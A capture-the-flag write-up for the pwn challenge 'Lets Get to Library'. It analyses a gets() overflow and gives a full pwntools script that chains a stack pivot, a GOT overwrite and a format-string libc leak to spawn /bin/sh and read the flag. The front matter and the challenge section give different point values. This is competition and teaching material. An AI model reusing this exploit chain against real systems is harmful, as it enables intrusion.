---
title: "Lets Get to Library"
category: "Pwn"
tags: ["stack-buffer-overflow", "partial-relro", "got-overwrite", "format-string", "lazy-binding", "stack-pivot"]
solve_date: "2026-10-10T14:57:00+07:00"
language: "en"
points: 744
---

# Lets Get to Library

**Flag:** `kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}`  
**Author:** k3rn3lbr3ach3r  
**Service:** `nc 104.154.133.139 1337`  
**Challenge files:** `handout.7z` (binary + `libc.so.6` + `ld-2.39.so`)

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `handout.7z` | 834,735 | `e6640ce2b8a9dc006c58ee59d349e04dc92248313ea17ea7304cbab8983b165a` |
| `letsgettolibrary` | 16,016 | `08629a6ea388745d26407095c106dcfa0fb445f90c1300a98b475f10a6ce4497` |
| `libc.so.6` | 2,125,328 | `269ffadc51484e5e2cbcb9100a5e1cd78a72493c0e3e7b0611a5a4778718d8e9` |
| `ld-2.39.so` | 236,616 | `1d7133d7b9f94465978b2ae8d21ca3751c8dfaaecaa2d462aeaf1ec50e5c3a90` |

The bundled `flag.txt` only holds the placeholder `kBxAc{TEST_FLAG}`; the real flag has to be read from the service. The challenge Dockerfile serves the binary through `socat TCP-LISTEN:1337,reuseaddr,fork` as user `player` (uid 1337), with the flag at `/app/flag.txt`, mode 444.

## Challenge

Recorded challenge metadata: name `Lets Get to Library`, category Pwn, 927 points, service `nc 104.154.133.139 1337`, flag format `kBxAc{...}`. The artifact provides the binary plus its libc and linker. The program prints a greeting, reads one line with `gets()`, prints a reply, and exits; the goal is the flag on the running service.

## Analysis

### Protections and memory layout

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

RELRO stops just before `0x404000`, so the three GOT slots stay writable; `ld-2.39.so` is loaded through `.interp`/`RUNPATH`, so lazy binding is still in effect:

```text
Offset             Type               Symbol's Name
0000000000404000   R_X86_64_JUMP_SLOT setbuf@GLIBC_2.2.5
0000000000404008   R_X86_64_JUMP_SLOT printf@GLIBC_2.2.5
0000000000404010   R_X86_64_JUMP_SLOT gets@GLIBC_2.2.5
0000000000404030   R_X86_64_COPY      stdout@GLIBC_2.2.5
0000000000404040   R_X86_64_COPY      stdin@GLIBC_2.2.5
```

The two `R_X86_64_COPY` entries matter a lot: the `stdout`/`stdin` objects that libc itself dereferences live in the binary's `.bss` (`0x404030`, `0x404040`), so every later `printf`/`gets` goes through those copies.

`.bss` ends at `0x404050`, but the writable page extends to `0x404fff` — the whole range `0x404050..0x404fff` is mapped writable and unused, room enough for a fake stack.

### Only three gadgets

```text
0401146 <greet_reader>:
  401146: push rbp ; mov rbp,rsp
  40114a: lea rax,[rip+0xeb7]      # 402008 "Welcome to the library, Dear reader"
  401154: mov eax,0x0
  401159: call printf@plt
  40115f: pop rbp ; ret

0401161 <main>:
  401161: push rbp ; mov rbp,rsp ; add rsp,-0x80
  401169: mov rax,[rip+0x2ed0]     # 404040 stdin ; mov esi,0 ; call setbuf@plt
  40117d: mov rax,[rip+0x2eac]     # 404030 stdout ; mov esi,0 ; call setbuf@plt
  401191: lea rax,[rip+0xe98]      # "Enter your name to check out a book: " ; call printf@plt
  4011a5: lea rax,[rbp-0x80] ; mov rdi,rax ; mov eax,0x0 ; call gets@plt
  4011b6: call greet_reader
  4011bb: mov eax,0x0
  4011c0: leave ; ret
```

There is no other `pop rdi`/`pop rsi`/`pop rdx`; `main` has no loop and calls `gets` once. The three addresses `0x40115f` (`pop rbp; ret`), `0x4011a5` (read one line into `rbp-0x80`) and `0x4011c0` (`leave; ret`) are still enough:

- The 0x80-byte buffer overflows into saved rbp and the return address, so we can land on `pop rbp; ret` with an arbitrary `rbp`, then `leave; ret`.
- `leave; ret` sets `rsp := rbp`, `rbp := [rbp]`, `rip := [rbp+8]`. Because `gets@plt` returns into `greet_reader` (which only does `pop rbp; ret` and never pushes rbp again), every round ends with `leave; ret` on the rbp we own.
- A bounce frame `X` with `[X] = rbp_new` and `[X+8] = rip_new` therefore chooses both the **read destination** of the next line (`rbp-0x80`) and the **rsp** seen by libc.

Constraints derived from observed failures (see the last section):

1. libc frames (`gets`, `printf`) run from a few hundred up to ~0xa00 bytes **downward** from the call site, so anything still needed after a libc call must live **above** that call site.
2. `call` sites must keep rsp at a multiple of 16 (printf executes `movaps`).
3. `gets()` only stops at `\n`, so `0x00` bytes are writable and full 8-byte pointers can be stored; the NUL that `gets` appends lands in the `.data` hole at `0x404018` when the destination is `0x404010`, or at `0x404120` for the 144-byte write into `0x404090`.

## Solution

Six rounds, every transition through a bounce frame inside the writable page. Blob layout:

| Address | Role |
|---|---|
| `0x404050` | start of the blob (3664 bytes) |
| `0x404090`, `0x404098` | LOW control pair: `[rbp]`/`[rbp+8]` of the round whose `rbp = 0x404090` → read destination `0x404010` (gets@GOT) |
| `0x4040d0`, `0x4040d8` | control pair of the round that writes the blob |
| `0x404110`, `0x404118` | control pair for the round that writes into LOW |
| `0x404a00` | bounce of R1 |
| `0x404b00` | bounce of R2 (printf); `0x404b10` is rsp at the call, i.e. where printf's stack arguments begin |
| `0x404b80` | format string |
| `0x404c00` | control pair of the printf round |
| `0x404c40`, `0x404cc0`, `0x404d40` | bounces of R3, R4, R5 |
| `0x404e00` | the `/bin/sh` string |

**R1** — `rbp = 0x404090`, so `rdi = 0x404010`; the 8-byte line `p64(printf@plt)` turns `gets@GOT` into `printf@plt`. From now on `call gets@plt` no longer reads.

**R2** — `rbp = 0x404b80 + 0x80`, so `rdi = 0x404b80`: `call gets@plt` jumps to `printf@plt`, which formats a string we placed in advance:

```text
MRK%c%c%c%c%c%s%72c%hhn
```

The five `%c` conversions consume the register arguments (`rsi, rdx, rcx, r8, r9`) that we do not control; `%s` is then the first stack argument (exactly at rsp = `0x404b10`) and points to `0x404000`, printing the **6 raw bytes** stored in `setbuf@GOT`, i.e. a real libc address. The character count accumulated at that moment is `3 (MRK) + 5 + 6 + 72 = 86 = 0x56`, so `%hhn` (the third stack argument, pointing at `0x404010`) stores `0x56` into the low byte of `gets@GOT`:

```text
0x401040 (printf@plt)  ->  0x401056 (the resolver stub inside gets@plt)
```

That is the trick that gives reads back. It needs no libc address, and on the next `call gets@plt` the dynamic linker resolves `gets`, **writes the full 8-byte pointer into the GOT itself**, and jumps into `gets` with `rdi` untouched — so the following round is again a valid read, and `stdout` is still a real FILE*.

**R3** — `rbp = 0x404110`, so the read destination is `0x404090` (LOW). The printf frame from R2 had already clobbered LOW and `0x404110`, so this 144-byte line rewrites both control pairs: `LOW := (0x404d40, leave;ret)` and `0x404110 := (0x404cc0, leave;ret)`.

**R4** — `rbp = 0x404090`, destination `gets@GOT`; the 8 bytes `p64(base + 0x58740)` install `system`. `base` comes from the leak: `base = u64(leak) - 0x8f740`.

**R5** — `rbp = 0x404e80`, so `rdi = 0x404e00 = "/bin/sh"`; `call gets@plt` is now `system("/bin/sh")`. The shell inherits the socat socket, so command output returns over the same connection.

Full script (`solve.py`; `libc.so.6` from the handout is read for the offsets, and the loop retries because the leak can be cut by a zero byte):

```python
#!/usr/bin/env python3
"""letsgettolibrary (kBxAc, Pwn 927). Rounds:
  B0 rbp=0x4040d0 IMAGE@0x404050 (3664B): bounce frames, format, args, "/bin/sh"
  R1 rbp=0x404090 8B @gets@GOT := printf@plt
  R2 rdi=0x404b80 printf(FMT): %s leaks setbuf@GOT (6 raw bytes);
     %hhn writes 0x56 -> gets@GOT becomes 0x401056 = gets' resolver stub,
     so the next gets@plt call lets ld.so install the real libc gets again
  R3 rbp=0x404110 144B @0x404090 rewrite LOW/0x404110 pairs clobbered by printf
  R4 rbp=0x404090 8B @gets@GOT := libc system
  R5 rbp=0x404e80 rdi = 0x404e00 "/bin/sh" -> system("/bin/sh")
"""
import os, sys
from pwn import *
# On Windows pwntools' ELF() emulates the PLT with unicorn and crashes; skip it.
try:
    import pwnlib.elf.elf as _e
    _e.ELF._populate_plt = lambda self: None
except Exception:
    pass

HOST = os.environ.get('H', '104.154.133.139')
PORT = int(os.environ.get('P', '1337'))
BANNER = b'Welcome to the library, Dear reader'
PROMPT = b'Enter your name to check out a book: '
MRK = b'MRK'

SETUP_WR, POP_RBP, LEAVERET = 0x4011a5, 0x40115f, 0x4011c0
PLT_PRINTF = 0x401040
GOT_SETBUF, GOT_GETS = 0x404000, 0x404010

IMAGE, IMGEND = 0x404050, 0x404ea0
R_IMG, LOW, R_LOWWR = 0x4040d0, 0x404090, 0x404110
X1 = 0x404a00                         # R1 bounce (consumed before printf)
XP = 0x404b00                         # printf bounce; 0x404b10 and up survive it
ARGS = XP + 0x10                      # first stack argument of printf
FMT, R_FMT = 0x404b80, 0x404c00       # R_FMT = FMT+0x80 = printf round's pair
XL, XG2 = 0x404c40, 0x404cc0
XS = 0x404d40                         # above R4's call site 0x404cd0
SH, R_SH = 0x404e00, 0x404e80
assert all(x % 16 == 0 for x in (X1, XP, XL, XG2, XS))

OFF_SETBUF, OFF_SYSTEM = 0x8f740, 0x58740      # readelf -sW libc.so.6
if os.path.exists('libc.so.6'):
    _l = ELF('libc.so.6')
    OFF_SETBUF, OFF_SYSTEM = _l.symbols['setbuf'], _l.symbols['system']

# 3 + 5 + 6 + 72 = 86 = 0x56 written by %hhn into gets@GOT byte 0
FMT_STR = MRK + b'%c%c%c%c%c%s' + b'%72c%hhn'


class Img:
    def __init__(self, base):
        self.base, self.d = base, {}

    def put(self, a, c):
        old = self.d.get(a)
        assert old is None or old == c, 'conflict at %#x' % a
        self.d[a] = c

    def q(self, a, v):
        for i, c in enumerate(p64(v)):
            self.put(a + i, c)
        return self

    def b(self, a, data):
        for i, c in enumerate(data):
            self.put(a + i, c)
        return self

    def out(self, end):
        buf = bytearray(end - self.base)
        for a, c in self.d.items():
            assert self.base <= a < end, 'out of range %#x' % a
            buf[a - self.base] = c
        bad = [hex(self.base + i) for i, c in enumerate(buf) if c == 0x0a]
        assert not bad, 'newline at %s' % bad
        return bytes(buf)


def bounce(p, x, rbp):
    """leave;ret landing on x -> rbp/rip, call site rsp = x+0x10"""
    p.q(x, rbp)
    p.q(x + 8, SETUP_WR)


def build():
    p = Img(IMAGE)
    p.q(R_IMG, X1); p.q(R_IMG + 8, LEAVERET)         # B0 -> R1
    p.q(LOW, XP); p.q(LOW + 8, LEAVERET)             # R1 -> R2 (printf)
    p.q(R_FMT, XL); p.q(R_FMT + 8, LEAVERET)         # R2 -> R3
    p.q(R_LOWWR, XG2); p.q(R_LOWWR + 8, LEAVERET)    # R3 -> R4
    bounce(p, X1, LOW)                               # R1: rdi = gets@GOT
    bounce(p, XP, R_FMT)                             # R2: rdi = FMT
    bounce(p, XL, R_LOWWR)                           # R3: rdi = 0x404090
    bounce(p, XG2, LOW)                              # R4: rdi = gets@GOT
    bounce(p, XS, R_SH)                              # R5: rdi = "/bin/sh"
    p.q(ARGS, GOT_SETBUF)                            # %s leak target
    p.q(ARGS + 8, GOT_GETS)                          # %c char sink
    p.q(ARGS + 0x10, GOT_GETS)                       # %hhn target
    p.b(FMT, FMT_STR)
    p.b(SH, b'/bin/sh\0')
    return p.out(IMGEND)


L_R1 = p64(PLT_PRINTF)
L_R3 = (p64(XS) + p64(LEAVERET) + b'B' * (R_LOWWR - (LOW + 16))
        + p64(XG2) + p64(LEAVERET))


def drain(r, secs=3.0):
    buf = b''
    r.settimeout(secs)
    try:
        while True:
            c = r.recv(timeout=secs)
            if not c:
                break
            buf += c
    except Exception:
        pass
    return buf


def parse(out):
    """the 6 leaked bytes sit right after the five %c bytes following MRK"""
    i = out.rfind(MRK)
    if i < 0:
        log.warning('no marker %r' % out[-70:])
        return None
    tail = out[i + 3:i + 40]
    for k in range(12):
        raw = tail[k:k + 6]
        if len(raw) < 6:
            break
        base = u64(raw + b'\0\0') - OFF_SETBUF
        if base & 0xfff == 0 and 0x7f0000000000 < base < 0x800000000000:
            log.info('leak %r at +%d -> base %#x' % (raw, k, base))
            return base
    log.warning('no aligned base, tail=%r' % tail)
    return None


def attempt(n):
    r = remote(HOST, PORT, timeout=30)
    r.settimeout(8)
    r.recvuntil(b'book: ', timeout=10)
    r.sendline(b'A' * 0x80 + p64(0x41414141) + p64(POP_RBP)
               + p64(R_IMG) + p64(SETUP_WR))
    r.sendline(build())
    r.sendline(L_R1)
    base = parse(drain(r, 4))
    log.info('try%d base=%s' % (n, base and hex(base)))
    ptr = p64(base + OFF_SYSTEM) if base else None
    if ptr is None or b'\x0a' in ptr:      # a 0x0a would truncate the write
        r.close()
        return None
    r.sendline(L_R3)
    drain(r, 2)
    r.sendline(ptr)
    drain(r, 2)
    r.sendline(b'id; cat /app/flag.txt 2>&1; echo __DONE__')
    res = drain(r, 8)
    print(res.decode('utf-8', 'replace'))
    r.close()
    if b'__DONE__' in res:
        open('SHELL_%d.bin' % n, 'wb').write(res)
        return res
    return None


if __name__ == '__main__':
    for n in range(1, (int(sys.argv[1]) if len(sys.argv) > 1 else 8) + 1):
        try:
            if attempt(n):
                break
        except Exception as e:
            log.warning('try%d %s: %s' % (n, type(e).__name__, e))
```

Two consecutive runs succeed with different ASLR bases:

```text
[*] leak b'@W\x83\x04\xe4\x7f' at +5 -> base 0x7fe4047a6000
[*] leak b'@\xf7[&\x98\x7f' at +5 -> base 0x7f9826530000
```

```text
uid=1337(player) gid=1337(player) groups=1337(player)
kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}__DONE__
```

`/app/flag.txt` has no trailing newline, so the `__DONE__` marker sits right after `}`; the flag bytes are stored verbatim in `SHELL_1.bin`.

## Approaches tested

The three failures below are properties of the target process, not environment noise, and they dictated the memory layout above:

- **Positional format specifiers (`%N$`) kill the process.** With `FMT = b'%6$s'` or `b'%1$p'` the printf round emits nothing and the connection closes, while `b'ABC'`, `b'%p'` and `b'%p%p%p%p%p%pMRK%s'` (non-positional) all print as expected. The positional path in `vfprintf` allocates according to the format and exceeds the space between rsp and the page start at `0x404000`, so the solution uses only non-positional conversions.
- **`0x404030`/`0x404040` must not be overwritten.** Once the `stdout`/`stdin` copies hold anything else (the next read then has no valid FILE*), the following round dies at the banner. The blob therefore starts at `0x404050`, and `system` is reached through `gets@GOT` rather than through the setbuf path.
- **libc frames grow downward.** While the last round's bounce frame sat at `0x404c80`, below the previous round's call site (`0x404cd0`), R4 completed but R5 crashed silently; moving `XS`/`SH`/`R_SH` to `0x404d40`/`0x404e00`/`0x404e80` let the whole chain finish. For the same reason R3 exists solely to rewrite LOW and `0x404110`, which the printf frame had clobbered.

## Result

The flag was read directly from the service through the shell obtained by `system("/bin/sh")`, under the identity `uid=1337(player)` that matches the challenge Dockerfile:

```text
kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}
```

No submission response was recorded.

## Reproduce

Python 3 plus pwntools (`pip install pwntools`). Save the fenced block in the Solution section as `solve.py` and place the handout `libc.so.6` in the same directory so the script reads `setbuf`/`system` from it; without the file it falls back to the hardcoded `0x8f740` / `0x58740`. Verify those with:

```bash
readelf -sW libc.so.6 | grep -E " (setbuf|system|gets)@"
```

```text
 550: 000000000008f740   14 FUNC  GLOBAL DEFAULT 17 setbuf@@GLIBC_2.2.5
 791: 0000000000087070  478 FUNC  WEAK   DEFAULT 17 gets@@GLIBC_2.2.5
1050: 0000000000058740   45 FUNC  WEAK   DEFAULT 17 system@@GLIBC_2.2.5
```

```bash
python solve.py 8
```

```text
[*] try1 base=0x7f9826530000
uid=1337(player) gid=1337(player) groups=1337(player)
kBxAc{...}__DONE__
```

Notes for a rerun:

- The script retries automatically (8 attempts by default) for two random conditions: the 6-byte leak being cut when an intermediate byte is `0x00` (roughly `3/256`), or `p64(base + system)` containing a `0x0a` byte that truncates the R4 line. Both are detected and skipped; a fresh connection yields a different base.
- On Windows, pwntools' `ELF()` emulates the PLT with unicorn and crashes; the two lines setting `pwnlib.elf.elf.ELF._populate_plt = lambda self: None` in `solve.py` disable that step. On Linux they can be dropped.
- To follow the rounds one by one, insert `drain(r, 2)` after each `sendline` and count `BANNER`: every read-terminated round prints `Welcome to the library, Dear reader` exactly once.
